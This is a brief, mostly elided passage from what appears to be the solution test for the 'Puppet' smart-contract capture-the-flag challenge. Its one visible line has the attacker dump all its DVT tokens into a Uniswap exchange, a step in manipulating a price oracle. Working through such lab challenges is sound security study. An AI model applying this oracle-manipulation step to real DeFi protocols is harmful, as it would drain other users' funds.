...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        // swap attacker's DVT tokens to ETH using uniswap
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(this.token.balanceOf(attacker.address), 9, Date.now() + 180)
